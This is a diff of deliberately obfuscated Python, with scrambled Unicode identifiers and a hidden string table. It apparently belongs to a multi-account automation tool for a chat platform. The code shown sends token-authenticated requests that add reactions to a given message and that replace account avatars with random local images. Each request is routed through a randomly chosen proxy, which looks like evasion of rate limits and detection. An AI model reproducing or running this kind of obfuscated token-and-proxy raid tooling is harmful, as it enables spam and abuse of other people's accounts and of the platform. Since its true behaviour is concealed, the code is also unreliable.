-        𝘳𝙧 = 𝙧𝙚𝘲𝘂𝗲𝘀𝘁𝘴.put(f'{𝗡𝗠𝗠𝘔𝘕𝘭𝙡𝘔𝘔𝙡𝙈𝗠𝘕𝙡𝙄𝘔𝗜𝘐𝗡𝘔𝗜𝗜𝗠𝗜𝗹𝙄𝘕𝘐𝗠𝗜𝗜𝘔[273]}{𝙘𝘩𝗮𝙣𝙣𝘦𝗹_𝗶𝘥}{𝘕𝙈𝗠𝘔𝙉𝗹𝘭𝗠𝘔𝘭𝗠𝙈𝙉𝗹𝙄𝙈𝘐𝗜𝘕𝙈𝘐𝘐𝗠𝘐𝗹𝗜𝙉𝗜𝙈𝘐𝙄𝘔[323]}{𝗺𝗲𝘴𝘴𝗮𝘨𝗲_𝗶𝘥}{𝘕𝘔𝘔𝘔𝗡𝗹𝗹𝗠𝘔𝙡𝙈𝗠𝗡𝗹𝙄𝙈𝙄𝘐𝘕𝗠𝗜𝙄𝗠𝗜𝘭𝘐𝙉𝗜𝗠𝘐𝗜𝙈[324]}{𝙚𝗺𝘰𝘫𝙞}{𝙉𝙈𝙈𝗠𝗡𝘭𝙡𝗠𝗠𝗹𝙈𝙈𝙉𝙡𝙄𝘔𝘐𝙄𝘕𝗠𝘐𝙄𝗠𝗜𝙡𝗜𝗡𝗜𝘔𝗜𝙄𝘔[325]}', headers=𝗵𝙚𝙖𝗱𝘦𝗿𝘀, json={}, proxy={𝘕𝗠𝘔𝙈𝗡𝗹𝙡𝗠𝙈𝗹𝙈𝗠𝘕𝗹𝘐𝘔𝗜𝗜𝙉𝗠𝗜𝙄𝙈𝙄𝙡𝘐𝙉𝘐𝘔𝘐𝘐𝘔[251]: 𝘕𝙈𝗠𝗠𝙉𝙡𝘭𝙈𝗠𝗹𝙈𝗠𝘕𝙡𝙄𝙈𝗜𝘐𝘕𝘔𝙄𝗜𝘔𝙄𝗹𝙄𝗡𝙄𝘔𝘐𝙄𝗠[253] + 𝘳𝙖𝙣𝘥𝙤𝗺.choice(𝗽𝘳𝗼𝙭𝘪𝘦𝘴), 𝘕𝘔𝙈𝙈𝙉𝘭𝘭𝗠𝗠𝙡𝙈𝙈𝗡𝙡𝘐𝙈𝙄𝘐𝙉𝘔𝘐𝘐𝗠𝗜𝘭𝗜𝙉𝗜𝙈𝘐𝗜𝙈[252]: 𝙉𝘔𝗠𝗠𝘕𝘭𝗹𝙈𝗠𝗹𝘔𝙈𝗡𝗹𝗜𝙈𝘐𝘐𝗡𝘔𝗜𝙄𝙈𝗜𝗹𝘐𝘕𝙄𝙈𝗜𝗜𝘔[253] + 𝗿𝙖𝙣𝗱𝙤𝙢.choice(𝗽𝗿𝙤𝙭𝗶𝙚𝘀)})
+    𝙝𝘦𝙖𝗱𝘦𝗿𝙨 = 𝘏𝘦𝘢𝙙𝗲𝘳𝘴(𝙩𝙤𝘬𝘦𝗻)
+    𝙘𝘩𝙖𝙣𝙣𝙚𝘭_𝙞𝘥 = 𝘮𝗲𝙨𝘴𝙖𝘨𝙚_𝗹𝗶𝘯𝙠.split(𝗜𝘕𝗜𝘕𝗹𝘭𝗜𝘔𝘐𝙄𝙡𝘔𝙡𝘭𝗜𝗹𝙡𝘕𝘕𝘐𝗹𝗹𝗠𝘕𝙡𝙉𝗹𝙈𝙄𝗠𝗜𝙈[315])[5]
+    𝗺𝙚𝙨𝘀𝙖𝗴𝘦_𝗶𝗱 = 𝗺𝙚𝘴𝘀𝗮𝙜𝘦_𝙡𝙞𝘯𝙠.split(𝘐𝙉𝘐𝗡𝘭𝗹𝗜𝙈𝘐𝙄𝘭𝙈𝗹𝘭𝙄𝗹𝙡𝙉𝗡𝙄𝘭𝗹𝙈𝘕𝗹𝘕𝘭𝙈𝗜𝘔𝘐𝗠[315])[6]
+    if 𝘱𝙧𝙤𝘹𝘆:
+        𝘳𝗿 = 𝘳𝘦𝗾𝘂𝘦𝘀𝙩𝘴.put(f'{𝘐𝙉𝗜𝗡𝗹𝙡𝗜𝙈𝙄𝘐𝙡𝘔𝙡𝘭𝘐𝘭𝘭𝙉𝗡𝘐𝗹𝗹𝙈𝗡𝙡𝗡𝗹𝘔𝙄𝙈𝗜𝙈[266]}{𝗰𝗵𝗮𝘯𝙣𝘦𝘭_𝙞𝙙}{𝘐𝗡𝙄𝗡𝗹𝗹𝙄𝘔𝘐𝗜𝗹𝘔𝙡𝘭𝗜𝗹𝙡𝗡𝙉𝙄𝙡𝘭𝙈𝘕𝗹𝙉𝙡𝙈𝗜𝘔𝘐𝘔[316]}{𝗺𝗲𝘀𝘀𝙖𝙜𝙚_𝙞𝘥}{𝙄𝗡𝙄𝗡𝙡𝗹𝗜𝘔𝘐𝗜𝗹𝙈𝘭𝙡𝙄𝘭𝘭𝘕𝙉𝘐𝙡𝙡𝗠𝙉𝘭𝘕𝙡𝗠𝘐𝘔𝘐𝘔[317]}{𝘦𝗺𝙤𝗷𝗶}{𝗜𝘕𝙄𝙉𝙡𝙡𝗜𝗠𝘐𝘐𝘭𝗠𝙡𝘭𝙄𝗹𝙡𝙉𝗡𝗜𝗹𝙡𝗠𝙉𝙡𝘕𝘭𝗠𝘐𝙈𝗜𝗠[318]}', headers=𝙝𝘦𝘢𝙙𝙚𝘳𝙨, json={}, proxy={𝘐𝘕𝗜𝗡𝘭𝗹𝙄𝘔𝗜𝘐𝗹𝗠𝗹𝘭𝘐𝗹𝗹𝙉𝘕𝗜𝘭𝘭𝙈𝙉𝘭𝘕𝗹𝗠𝘐𝙈𝘐𝙈[244]: 𝘐𝙉𝗜𝙉𝘭𝗹𝗜𝘔𝘐𝙄𝙡𝗠𝙡𝙡𝘐𝘭𝙡𝙉𝙉𝙄𝗹𝘭𝘔𝙉𝘭𝙉𝘭𝗠𝗜𝗠𝘐𝙈[246] + 𝘳𝗮𝙣𝗱𝘰𝘮.choice(𝙥𝗿𝙤𝘹𝙞𝘦𝘀), 𝘐𝘕𝘐𝗡𝙡𝙡𝗜𝘔𝗜𝙄𝘭𝙈𝙡𝙡𝘐𝙡𝘭𝘕𝗡𝘐𝙡𝗹𝘔𝘕𝘭𝘕𝙡𝙈𝘐𝘔𝙄𝘔[245]: 𝘐𝗡𝙄𝙉𝗹𝗹𝙄𝙈𝙄𝗜𝙡𝗠𝘭𝘭𝙄𝗹𝗹𝙉𝘕𝙄𝗹𝗹𝙈𝙉𝘭𝗡𝘭𝘔𝘐𝘔𝘐𝘔[246] + 𝙧𝘢𝘯𝗱𝗼𝙢.choice(𝗽𝗿𝘰𝙭𝘪𝙚𝘀)})
     else:
-        𝙧𝗿 = 𝗿𝘦𝙦𝘶𝘦𝘀𝙩𝘴.put(f'{𝗡𝙈𝗠𝙈𝘕𝙡𝗹𝙈𝘔𝘭𝙈𝗠𝙉𝙡𝗜𝘔𝙄𝘐𝘕𝗠𝘐𝙄𝙈𝗜𝘭𝗜𝗡𝗜𝘔𝘐𝘐𝗠[273]}{𝘤𝙝𝘢𝘯𝙣𝘦𝙡_𝙞𝙙}{𝘕𝙈𝘔𝗠𝘕𝙡𝘭𝘔𝙈𝘭𝙈𝘔𝗡𝙡𝘐𝗠𝙄𝘐𝗡𝗠𝗜𝗜𝘔𝗜𝙡𝘐𝗡𝙄𝗠𝙄𝘐𝘔[323]}{𝙢𝙚𝙨𝘴𝘢𝙜𝙚_𝗶𝙙}{𝙉𝘔𝙈𝙈𝘕𝙡𝗹𝘔𝗠𝙡𝙈𝙈𝙉𝘭𝙄𝙈𝗜𝗜𝗡𝙈𝘐𝘐𝘔𝙄𝘭𝘐𝘕𝗜𝘔𝗜𝗜𝗠[324]}{𝙚𝘮𝘰𝘫𝙞}{𝙉𝗠𝙈𝗠𝘕𝘭𝗹𝘔𝗠𝘭𝘔𝘔𝙉𝗹𝗜𝙈𝘐𝙄𝙉𝘔𝘐𝙄𝘔𝗜𝙡𝘐𝙉𝙄𝗠𝘐𝙄𝘔[325]}', headers=𝗵𝗲𝗮𝙙𝗲𝙧𝘀, json={})
-    𝙙𝙣 = 𝙩𝘰𝗸𝙚𝙣.split(𝙉𝗠𝙈𝙈𝗡𝗹𝗹𝘔𝙈𝙡𝗠𝙈𝙉𝘭𝙄𝙈𝙄𝘐𝘕𝗠𝗜𝙄𝙈𝘐𝙡𝙄𝗡𝘐𝙈𝘐𝗜𝙈[254])
-    𝗻𝙣 = 𝙙𝗻[0]
-    if 𝙧𝗿.status_code == 204:
-        𝗽𝙧𝙞𝗻𝙩(f"{𝘳}{𝘕𝗠𝙈𝘔𝘕𝙡𝙡𝗠𝘔𝗹𝙈𝘔𝙉𝘭𝙄𝙈𝗜𝘐𝙉𝘔𝙄𝙄𝙈𝗜𝘭𝘐𝗡𝗜𝗠𝘐𝙄𝗠[98]}{𝘥𝘢𝘵𝗲𝘵𝗶𝗺𝗲.datetime.now().strftime(f'{𝗴}{𝗡𝙈𝘔𝗠𝙉𝗹𝗹𝘔𝙈𝙡𝘔𝘔𝙉𝗹𝘐𝗠𝙄𝗜𝘕𝘔𝘐𝙄𝗠𝘐𝙡𝙄𝗡𝘐𝘔𝙄𝙄𝗠[99]}{𝘳}')}{𝘕𝘔𝗠𝘔𝘕𝘭𝘭𝗠𝘔𝙡𝗠𝗠𝙉𝙡𝙄𝙈𝙄𝙄𝙉𝘔𝙄𝙄𝘔𝗜𝘭𝙄𝙉𝘐𝗠𝘐𝘐𝗠[100]}{𝙧}{𝘕𝗠𝘔𝘔𝗡𝘭𝘭𝗠𝗠𝘭𝙈𝘔𝙉𝙡𝘐𝗠𝘐𝘐𝗡𝗠𝙄𝗜𝗠𝗜𝘭𝙄𝗡𝘐𝘔𝗜𝗜𝙈[98]}{𝙡𝙘}{𝘕𝘔𝘔𝘔𝘕𝘭𝙡𝘔𝗠𝘭𝙈𝘔𝗡𝙡𝘐𝙈𝙄𝗜𝗡𝙈𝙄𝙄𝗠𝘐𝗹𝘐𝙉𝙄𝗠𝙄𝙄𝗠[326]}{𝘳}{𝙉𝘔𝙈𝘔𝘕𝘭𝗹𝗠𝗠𝗹𝗠𝙈𝙉𝙡𝙄𝘔𝘐𝘐𝘕𝙈𝘐𝗜𝘔𝗜𝙡𝗜𝙉𝗜𝗠𝘐𝙄𝘔[100]}{𝘯𝙣}{𝘨}{𝗡𝙈𝙈𝙈𝘕𝗹𝘭𝘔𝘔𝙡𝘔𝙈𝙉𝙡𝘐𝘔𝗜𝙄𝙉𝙈𝘐𝘐𝘔𝘐𝗹𝘐𝙉𝗜𝗠𝗜𝗜𝗠[277]}{𝗿𝙧.text}")
+        𝗿𝙧 = 𝗿𝘦𝙦𝘂𝗲𝙨𝘁𝙨.put(f'{𝙄𝙉𝙄𝗡𝙡𝙡𝗜𝘔𝙄𝘐𝗹𝗠𝘭𝘭𝙄𝘭𝗹𝗡𝗡𝘐𝙡𝗹𝘔𝘕𝘭𝙉𝗹𝘔𝙄𝙈𝗜𝗠[266]}{𝘤𝘩𝗮𝙣𝗻𝘦𝘭_𝙞𝗱}{𝗜𝘕𝗜𝙉𝙡𝗹𝗜𝗠𝗜𝙄𝙡𝗠𝗹𝙡𝘐𝙡𝙡𝗡𝘕𝙄𝗹𝗹𝙈𝘕𝘭𝗡𝗹𝘔𝘐𝘔𝙄𝗠[316]}{𝗺𝗲𝘀𝘀𝙖𝗴𝗲_𝙞𝙙}{𝘐𝘕𝗜𝙉𝙡𝘭𝗜𝙈𝙄𝘐𝗹𝗠𝘭𝘭𝘐𝘭𝙡𝙉𝘕𝙄𝗹𝘭𝙈𝗡𝙡𝘕𝘭𝙈𝗜𝙈𝙄𝙈[317]}{𝘦𝙢𝙤𝙟𝙞}{𝙄𝗡𝗜𝘕𝗹𝗹𝗜𝗠𝙄𝘐𝙡𝗠𝘭𝙡𝙄𝗹𝙡𝘕𝙉𝘐𝘭𝗹𝙈𝘕𝙡𝗡𝙡𝗠𝗜𝗠𝘐𝙈[318]}', headers=𝘩𝙚𝘢𝙙𝘦𝙧𝘴, json={})
+    𝙙𝘯 = 𝙩𝗼𝘬𝘦𝘯.split(𝗜𝙉𝗜𝗡𝗹𝘭𝗜𝗠𝙄𝗜𝙡𝙈𝙡𝘭𝙄𝙡𝗹𝙉𝙉𝘐𝗹𝘭𝗠𝘕𝙡𝙉𝗹𝗠𝘐𝗠𝙄𝘔[247])
+    𝗻𝗻 = 𝗱𝗻[0]
+    if 𝘳𝗿.status_code == 204:
+        𝙥𝗿𝗶𝘯𝘁(f"{𝙧}{𝙄𝙉𝘐𝘕𝙡𝗹𝘐𝘔𝙄𝘐𝘭𝗠𝘭𝘭𝗜𝗹𝘭𝙉𝙉𝙄𝘭𝗹𝙈𝙉𝗹𝘕𝘭𝘔𝗜𝘔𝗜𝙈[91]}{𝙙𝙖𝙩𝘦𝙩𝗶𝙢𝙚.datetime.now().strftime(f'{𝗴}{𝘐𝘕𝙄𝙉𝙡𝗹𝙄𝙈𝘐𝗜𝗹𝘔𝙡𝗹𝘐𝙡𝘭𝗡𝗡𝘐𝘭𝘭𝘔𝙉𝗹𝘕𝙡𝙈𝘐𝙈𝙄𝙈[92]}{𝗿}')}{𝘐𝘕𝙄𝗡𝗹𝗹𝗜𝘔𝙄𝘐𝗹𝗠𝙡𝙡𝗜𝙡𝗹𝙉𝙉𝘐𝘭𝘭𝗠𝘕𝗹𝘕𝘭𝘔𝙄𝘔𝘐𝗠[93]}{𝗿}{𝙄𝗡𝙄𝘕𝘭𝘭𝙄𝙈𝘐𝘐𝙡𝘔𝗹𝘭𝘐𝙡𝙡𝘕𝘕𝘐𝙡𝘭𝗠𝘕𝗹𝗡𝗹𝘔𝙄𝙈𝘐𝗠[91]}{𝘭𝙘}{𝗜𝗡𝗜𝗡𝙡𝘭𝘐𝙈𝘐𝗜𝗹𝙈𝙡𝙡𝙄𝘭𝘭𝗡𝙉𝙄𝘭𝗹𝘔𝗡𝗹𝗡𝗹𝙈𝗜𝗠𝗜𝙈[319]}{𝗿}{𝘐𝙉𝗜𝙉𝗹𝘭𝗜𝙈𝙄𝗜𝙡𝘔𝘭𝙡𝗜𝗹𝙡𝘕𝗡𝗜𝘭𝘭𝗠𝙉𝘭𝙉𝗹𝗠𝙄𝙈𝗜𝗠[93]}{𝗻𝗻}{𝙜}{𝘐𝘕𝙄𝘕𝘭𝙡𝘐𝙈𝘐𝗜𝙡𝙈𝗹𝗹𝙄𝘭𝙡𝗡𝘕𝙄𝙡𝙡𝗠𝘕𝙡𝘕𝙡𝘔𝗜𝙈𝗜𝙈[270]}{𝘳𝘳.text}")
     else:
-        𝗽𝘳𝗶𝙣𝘵(f"{𝘳}{𝘕𝗠𝘔𝙈𝘕𝗹𝘭𝘔𝙈𝗹𝘔𝗠𝙉𝘭𝘐𝗠𝗜𝗜𝙉𝘔𝗜𝙄𝙈𝘐𝘭𝗜𝙉𝘐𝘔𝗜𝙄𝘔[98]}{𝘥𝙖𝙩𝘦𝙩𝘪𝘮𝙚.datetime.now().strftime(f'{𝙜}{𝙉𝘔𝘔𝗠𝗡𝗹𝘭𝗠𝗠𝘭𝙈𝙈𝘕𝘭𝙄𝗠𝘐𝙄𝘕𝗠𝗜𝙄𝘔𝙄𝙡𝗜𝘕𝗜𝘔𝘐𝘐𝙈[99]}{𝗿}')}{𝙉𝗠𝘔𝘔𝙉𝘭𝙡𝘔𝙈𝘭𝗠𝘔𝙉𝗹𝘐𝗠𝙄𝘐𝗡𝗠𝗜𝘐𝘔𝘐𝙡𝗜𝙉𝙄𝘔𝗜𝘐𝙈[100]}{𝙧}{𝘕𝘔𝘔𝘔𝘕𝗹𝙡𝗠𝙈𝙡𝘔𝙈𝘕𝗹𝗜𝘔𝗜𝘐𝘕𝘔𝗜𝙄𝗠𝘐𝘭𝙄𝘕𝘐𝙈𝙄𝘐𝗠[98]}{𝗯}{𝗡𝙈𝗠𝗠𝙉𝗹𝗹𝘔𝘔𝙡𝘔𝗠𝗡𝗹𝙄𝗠𝙄𝗜𝙉𝘔𝗜𝙄𝘔𝙄𝘭𝘐𝙉𝙄𝗠𝘐𝘐𝙈[321]}{𝘳}{𝗡𝗠𝗠𝗠𝗡𝘭𝙡𝘔𝗠𝗹𝙈𝘔𝙉𝙡𝙄𝗠𝙄𝙄𝘕𝗠𝙄𝙄𝘔𝙄𝙡𝗜𝗡𝙄𝗠𝗜𝘐𝙈[100]}{𝘯𝗻}{𝙜}{𝗡𝙈𝙈𝘔𝘕𝘭𝘭𝗠𝗠𝘭𝗠𝗠𝗡𝘭𝙄𝘔𝙄𝘐𝘕𝙈𝗜𝗜𝗠𝙄𝘭𝗜𝗡𝙄𝗠𝘐𝙄𝙈[277]}{𝗿𝙧.text}")
+        𝗽𝗿𝗶𝘯𝘁(f"{𝘳}{𝘐𝘕𝗜𝗡𝗹𝘭𝘐𝘔𝙄𝘐𝘭𝘔𝙡𝘭𝗜𝙡𝘭𝗡𝘕𝘐𝙡𝘭𝗠𝙉𝘭𝘕𝘭𝙈𝘐𝗠𝘐𝗠[91]}{𝗱𝙖𝘵𝘦𝘵𝘪𝘮𝘦.datetime.now().strftime(f'{𝙜}{𝙄𝗡𝘐𝙉𝗹𝘭𝘐𝘔𝘐𝙄𝗹𝘔𝙡𝙡𝘐𝙡𝘭𝗡𝗡𝗜𝗹𝘭𝗠𝙉𝗹𝘕𝗹𝘔𝙄𝘔𝗜𝙈[92]}{𝗿}')}{𝗜𝗡𝘐𝘕𝗹𝘭𝗜𝙈𝘐𝙄𝗹𝙈𝙡𝙡𝘐𝗹𝙡𝙉𝗡𝘐𝙡𝗹𝘔𝗡𝙡𝙉𝗹𝗠𝘐𝙈𝗜𝘔[93]}{𝘳}{𝙄𝘕𝙄𝘕𝘭𝗹𝗜𝗠𝗜𝘐𝗹𝙈𝙡𝙡𝙄𝘭𝘭𝘕𝙉𝙄𝗹𝗹𝘔𝗡𝘭𝘕𝙡𝗠𝙄𝗠𝗜𝗠[91]}{𝘣}{𝘐𝘕𝗜𝘕𝘭𝘭𝘐𝘔𝙄𝙄𝘭𝘔𝙡𝗹𝘐𝘭𝗹𝘕𝘕𝗜𝙡𝗹𝙈𝙉𝗹𝙉𝙡𝗠𝘐𝗠𝘐𝗠[314]}{𝗿}{𝗜𝙉𝙄𝙉𝗹𝙡𝙄𝙈𝘐𝘐𝘭𝘔𝘭𝗹𝘐𝘭𝙡𝙉𝗡𝗜𝘭𝗹𝘔𝗡𝙡𝙉𝗹𝗠𝗜𝙈𝘐𝙈[93]}{𝗻𝗻}{𝗴}{𝗜𝘕𝘐𝘕𝙡𝗹𝘐𝙈𝘐𝙄𝗹𝙈𝗹𝘭𝗜𝘭𝙡𝙉𝗡𝗜𝙡𝙡𝙈𝙉𝗹𝗡𝙡𝙈𝘐𝙈𝗜𝘔[270]}{𝙧𝙧.text}")
 
 def avatar_changer(token):
-    𝙙𝗻 = 𝘁𝙤𝙠𝗲𝗻.split(𝙉𝗠𝗠𝘔𝗡𝙡𝙡𝘔𝗠𝙡𝗠𝘔𝗡𝘭𝘐𝙈𝘐𝙄𝘕𝗠𝘐𝙄𝘔𝗜𝙡𝙄𝙉𝙄𝙈𝗜𝙄𝗠[254])
-    𝗻𝘯 = 𝗱𝙣[0]
-    𝗵𝘦𝙖𝙙𝗲𝙧𝘴 = {𝙉𝙈𝘔𝗠𝙉𝙡𝘭𝘔𝙈𝘭𝘔𝙈𝘕𝘭𝘐𝙈𝙄𝗜𝗡𝙈𝘐𝘐𝙈𝘐𝗹𝘐𝗡𝗜𝗠𝘐𝘐𝙈[137]: 𝘁𝘰𝘬𝙚𝗻}
-    𝙥𝙞𝘤𝘵𝘂𝘳𝙚 = [𝗳 for 𝙛 in 𝙤𝙨.listdir(𝗡𝘔𝘔𝙈𝘕𝗹𝙡𝘔𝘔𝗹𝙈𝗠𝗡𝗹𝗜𝙈𝗜𝗜𝙉𝘔𝗜𝙄𝘔𝘐𝙡𝘐𝗡𝗜𝗠𝗜𝘐𝘔[327]) if 𝗶𝘴𝙛𝘪𝘭𝘦(𝙟𝘰𝙞𝘯(𝙉𝗠𝙈𝙈𝗡𝗹𝘭𝙈𝗠𝗹𝘔𝙈𝘕𝗹𝙄𝗠𝙄𝘐𝗡𝙈𝗜𝗜𝘔𝗜𝙡𝘐𝙉𝘐𝗠𝗜𝘐𝙈[327], 𝙛))]
-    𝗿𝙖𝘯𝙙𝗼𝗺_𝘱𝗶𝙘𝘁𝘂𝘳𝗲 = 𝙧𝙖𝙣𝗱𝗼𝙢.choice(𝘱𝘪𝘤𝘵𝘶𝘳𝘦)
-    with 𝘰𝙥𝙚𝘯(f'{𝗡𝘔𝘔𝘔𝘕𝙡𝘭𝙈𝗠𝙡𝙈𝙈𝘕𝗹𝘐𝘔𝗜𝙄𝗡𝙈𝘐𝘐𝗠𝗜𝘭𝗜𝙉𝘐𝗠𝙄𝘐𝗠[327]}{𝙧𝙖𝗻𝘥𝙤𝘮_𝗽𝙞𝙘𝘵𝘂𝙧𝙚}', 𝗡𝗠𝗠𝘔𝗡𝙡𝘭𝙈𝙈𝙡𝗠𝗠𝗡𝗹𝗜𝗠𝘐𝗜𝗡𝙈𝙄𝙄𝗠𝗜𝙡𝗜𝗡𝘐𝙈𝘐𝘐𝙈[328]) as 𝙛:
-        𝗲𝗻𝙘𝙤𝘥𝗲𝗱_𝙨𝙩𝗿𝘪𝙣𝗴 = 𝙗𝙖𝘀𝙚64.b64encode(𝗳.read())
-    𝘱𝗮𝘆𝙡𝗼𝘢𝘥 = {𝘕𝗠𝘔𝙈𝘕𝙡𝗹𝗠𝙈𝙡𝘔𝗠𝘕𝘭𝙄𝗠𝙄𝙄𝘕𝗠𝘐𝘐𝗠𝘐𝗹𝙄𝘕𝙄𝗠𝘐𝘐𝗠[329]: f'{𝙉𝘔𝙈𝙈𝙉𝘭𝘭𝙈𝘔𝙡𝙈𝘔𝗡𝙡𝘐𝘔𝘐𝘐𝘕𝗠𝙄𝘐𝗠𝙄𝙡𝗜𝗡𝘐𝘔𝘐𝘐𝙈[330]}{𝘦𝘯𝙘𝘰𝙙𝙚𝗱_𝘴𝘵𝗿𝙞𝘯𝗴.decode(𝘕𝙈𝙈𝗠𝘕𝙡𝗹𝙈𝗠𝗹𝘔𝙈𝗡𝗹𝘐𝘔𝗜𝙄𝗡𝘔𝘐𝗜𝘔𝗜𝗹𝙄𝗡𝙄𝙈𝙄𝗜𝘔[331])}'}
-    if 𝗽𝘳𝙤𝘅𝘆:
-        𝙧𝘳 = 𝗿𝘦𝙦𝘂𝙚𝙨𝙩𝙨.patch(f'{𝗡𝙈𝘔𝘔𝗡𝗹𝗹𝘔𝘔𝘭𝙈𝘔𝙉𝘭𝘐𝘔𝘐𝙄𝙉𝗠𝘐𝗜𝙈𝗜𝘭𝗜𝘕𝙄𝙈𝙄𝘐𝙈[332]}', headers=𝗵𝙚𝗮𝗱𝘦𝗿𝘀, json=𝗽𝙖𝘺𝘭𝙤𝗮𝙙, proxy={𝘕𝘔𝘔𝘔𝘕𝘭𝗹𝙈𝗠𝗹𝗠𝘔𝗡𝗹𝙄𝗠𝘐𝘐𝙉𝗠𝗜𝗜𝙈𝗜𝗹𝗜𝘕𝘐𝘔𝘐𝘐𝗠[251]: 𝙉𝙈𝗠𝘔𝗡𝙡𝘭𝗠𝘔𝗹𝗠𝙈𝙉𝘭𝗜𝗠𝘐𝗜𝘕𝙈𝙄𝗜𝗠𝘐𝙡𝗜𝙉𝗜𝘔𝙄𝙄𝗠[253] + 𝘳𝘢𝘯𝙙𝙤𝘮.choice(𝗽𝙧𝘰𝘅𝘪𝗲𝘀), 𝘕𝘔𝘔𝗠𝙉𝙡𝗹𝘔𝙈𝙡𝗠𝗠𝙉𝙡𝘐𝗠𝘐𝗜𝙉𝙈𝙄𝗜𝘔𝗜𝙡𝙄𝙉𝙄𝘔𝘐𝗜𝘔[252]: 𝙉𝘔𝘔𝗠𝗡𝗹𝙡𝗠𝙈𝙡𝙈𝘔𝗡𝘭𝙄𝘔𝘐𝙄𝙉𝙈𝘐𝙄𝙈𝘐𝙡𝗜𝙉𝘐𝘔𝗜𝙄𝙈[253] + 𝗿𝘢𝗻𝘥𝗼𝙢.choice(𝘱𝘳𝘰𝘅𝗶𝙚𝘴)})
+    𝙙𝙣 = 𝙩𝙤𝙠𝗲𝙣.split(𝘐𝘕𝗜𝘕𝘭𝗹𝙄𝘔𝗜𝗜𝘭𝘔𝙡𝘭𝘐𝘭𝙡𝘕𝘕𝙄𝗹𝙡𝙈𝗡𝘭𝘕𝗹𝗠𝙄𝗠𝗜𝙈[247])
+    𝙣𝙣 = 𝗱𝘯[0]
+    𝗵𝘦𝗮𝗱𝙚𝘳𝙨 = {𝗜𝙉𝘐𝗡𝗹𝘭𝗜𝗠𝗜𝗜𝗹𝗠𝗹𝘭𝗜𝙡𝙡𝘕𝙉𝙄𝗹𝙡𝗠𝗡𝙡𝙉𝘭𝙈𝘐𝗠𝗜𝙈[130]: 𝙩𝙤𝘬𝗲𝘯}
+    𝘱𝗶𝙘𝙩𝙪𝘳𝙚 = [𝙛 for 𝗳 in 𝘰𝘴.listdir(𝘐𝘕𝗜𝗡𝘭𝗹𝙄𝗠𝘐𝗜𝙡𝙈𝗹𝗹𝘐𝙡𝙡𝙉𝘕𝘐𝗹𝗹𝙈𝘕𝙡𝘕𝗹𝘔𝙄𝙈𝙄𝙈[320]) if 𝘪𝘀𝙛𝙞𝙡𝙚(𝗷𝘰𝙞𝘯(𝙄𝙉𝘐𝘕𝙡𝙡𝗜𝙈𝙄𝙄𝘭𝗠𝙡𝘭𝙄𝗹𝗹𝘕𝗡𝗜𝘭𝙡𝗠𝘕𝙡𝙉𝙡𝘔𝘐𝙈𝗜𝗠[320], 𝗳))]
+    𝙧𝗮𝗻𝗱𝙤𝘮_𝘱𝙞𝗰𝘵𝘶𝘳𝗲 = 𝗿𝙖𝗻𝙙𝘰𝘮.choice(𝘱𝘪𝗰𝙩𝙪𝘳𝙚)
+    with 𝙤𝗽𝗲𝙣(f'{𝗜𝙉𝙄𝗡𝗹𝘭𝗜𝘔𝘐𝘐𝙡𝗠𝗹𝘭𝙄𝗹𝘭𝘕𝙉𝘐𝘭𝘭𝘔𝘕𝗹𝗡𝗹𝙈𝗜𝗠𝙄𝗠[320]}{𝙧𝘢𝗻𝘥𝙤𝗺_𝘱𝙞𝙘𝙩𝙪𝙧𝗲}', 𝙄𝙉𝙄𝙉𝘭𝘭𝘐𝗠𝗜𝘐𝗹𝘔𝘭𝙡𝙄𝘭𝘭𝘕𝙉𝙄𝘭𝘭𝙈𝗡𝘭𝙉𝗹𝘔𝙄𝗠𝘐𝙈[321]) as 𝘧:
+        𝗲𝗻𝙘𝙤𝗱𝗲𝙙_𝘀𝙩𝗿𝗶𝗻𝗴 = 𝗯𝗮𝘴𝗲64.b64encode(𝘧.read())
+    𝙥𝙖𝙮𝙡𝙤𝗮𝙙 = {𝗜𝗡𝙄𝗡𝙡𝗹𝙄𝘔𝗜𝗜𝙡𝗠𝙡𝗹𝙄𝘭𝙡𝘕𝙉𝙄𝘭𝗹𝘔𝗡𝗹𝗡𝙡𝙈𝘐𝗠𝘐𝙈[322]: f'{𝙄𝘕𝗜𝘕𝗹𝙡𝙄𝙈𝗜𝗜𝗹𝗠𝘭𝘭𝙄𝙡𝙡𝙉𝘕𝙄𝗹𝙡𝘔𝙉𝘭𝘕𝙡𝙈𝗜𝙈𝘐𝗠[323]}{𝙚𝗻𝙘𝙤𝙙𝗲𝙙_𝘴𝘁𝙧𝗶𝙣𝗴.decode(𝘐𝙉𝘐𝘕𝘭𝘭𝗜𝘔𝙄𝙄𝘭𝘔𝙡𝙡𝗜𝗹𝙡𝗡𝗡𝙄𝗹𝙡𝗠𝙉𝘭𝘕𝘭𝘔𝙄𝘔𝗜𝘔[324])}'}
+    if 𝙥𝙧𝘰𝘹𝙮:
+        𝙧𝙧 = 𝗿𝙚𝗾𝘶𝙚𝙨𝘁𝘴.patch(f'{𝙄𝙉𝙄𝘕𝙡𝙡𝘐𝘔𝙄𝙄𝘭𝙈𝙡𝙡𝗜𝘭𝙡𝙉𝗡𝘐𝙡𝘭𝘔𝙉𝙡𝘕𝙡𝘔𝙄𝙈𝙄𝘔[325]}', headers=𝙝𝘦𝙖𝘥𝘦𝗿𝙨, json=𝗽𝗮𝘺𝙡𝙤𝙖𝙙, proxy={𝙄𝙉𝙄𝗡𝙡𝗹𝙄𝗠𝘐𝙄𝘭𝘔𝙡𝙡𝘐𝗹𝘭𝙉𝗡𝘐𝘭𝙡𝙈𝘕𝘭𝗡𝗹𝙈𝗜𝗠𝙄𝗠[244]: 𝙄𝙉𝘐𝙉𝗹𝘭𝙄𝗠𝗜𝘐𝙡𝙈𝘭𝘭𝗜𝗹𝙡𝘕𝙉𝗜𝙡𝙡𝗠𝙉𝗹𝗡𝘭𝗠𝙄𝘔𝘐𝗠[246] + 𝘳𝗮𝙣𝗱𝙤𝙢.choice(𝙥𝙧𝘰𝘅𝙞𝙚𝘀), 𝙄𝙉𝗜𝗡𝗹𝙡𝘐𝘔𝗜𝙄𝙡𝙈𝘭𝙡𝗜𝙡𝗹𝗡𝙉𝘐𝘭𝘭𝗠𝗡𝗹𝘕𝘭𝙈𝗜𝙈𝙄𝙈[245]: 𝙄𝗡𝘐𝘕𝙡𝗹𝘐𝘔𝘐𝘐𝘭𝙈𝘭𝘭𝗜𝘭𝗹𝙉𝗡𝘐𝙡𝗹𝙈𝘕𝘭𝙉𝘭𝗠𝗜𝘔𝙄𝗠[246] + 𝗿𝗮𝙣𝘥𝙤𝙢.choice(𝗽𝙧𝙤𝘹𝙞𝗲𝙨)})
     else:
